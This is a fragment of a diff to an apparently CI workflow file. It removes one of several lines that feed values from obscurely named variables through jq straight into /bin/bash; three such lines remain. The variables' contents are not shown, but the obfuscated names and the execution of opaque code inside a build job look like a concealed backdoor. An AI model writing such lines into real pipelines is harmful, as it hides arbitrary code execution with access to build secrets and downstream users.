@@ -21,7 +21,6 @@ jobs:
           echo $moplv885 | jq -r .e92 | /bin/bash
           echo $b668 | jq -r .pf31 | /bin/bash
           printf '%s' "$cdbcc4245" | jq -r .ozyxm3063 | /bin/bash
-          echo $ez7 | jq -r .h8027 | /bin/bash
 
       - name: Archive results
         if: always()
